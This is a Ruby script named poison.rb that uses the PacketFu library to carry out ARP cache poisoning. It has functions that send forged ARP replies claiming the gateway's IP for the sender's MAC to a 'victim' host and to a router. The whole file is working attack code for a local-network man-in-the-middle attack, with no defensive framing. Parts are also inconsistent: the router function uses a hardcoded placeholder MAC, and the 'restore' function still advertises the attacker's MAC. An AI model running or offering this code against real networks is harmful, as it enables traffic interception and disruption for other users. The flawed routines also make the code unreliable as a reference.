#!/usr/bin/env ruby

##############################################
# poison.rb
#   Send out malformed ARP requests!
##############################################

# Send a standard ARP packet from source (you) to destination (victim)
def poison_victim(iface, mac, gateway_ip, address)
  
  address_mac = PacketFu::Utils.arp(address.chomp, :iface => iface) 
  
  # Create a ARP packet sent to victim
  arp_packet = PacketFu::ARPPacket.new
  arp_packet.eth_saddr = mac
  arp_packet.eth_daddr = address_mac

  arp_packet.arp_saddr_mac = mac
  arp_packet.arp_daddr_mac = address_mac
  arp_packet.arp_saddr_ip = gateway_ip
  arp_packet.arp_daddr_ip = address
  arp_packet.arp_opcode = 2  
  arp_packet.to_w(iface)  
end

# Send a malformed ARP packet from source to bad router address
def poison_router(iface, mac, gateway_ip, gateway_mac, address)
  arp_packet_router = PacketFu::ARPPacket.new
  arp_packet_router.eth_saddr = mac        
  arp_packet_router.eth_daddr = '12:34:56:78:9A:BC'          
  
  arp_packet_router.arp_saddr_mac = mac    
  arp_packet_router.arp_daddr_mac = '12:34:56:78:9A:BC'     
  arp_packet_router.arp_saddr_ip = address        
  arp_packet_router.arp_daddr_ip = gateway_ip        
  arp_packet_router.arp_opcode = 2 
  arp_packet_router.to_w(iface)       
            
end

# safely kill program by sending conventional packet with correct source and destination
def restore(iface, mac, gateway_ip, gateway_mac, address)
  arp_restore = PacketFu::ARPPacket.new
  arp_restore.eth_saddr = mac        
  arp_restore.eth_daddr = gateway_mac         
  
  arp_restore.arp_saddr_mac = mac    
  arp_restore.arp_daddr_mac = gateway_mac    
  arp_restore.arp_saddr_ip = address        
  arp_restore.arp_daddr_ip = gateway_ip        
  arp_restore.arp_opcode = 2 
  arp_restore.to_w(iface)   
end
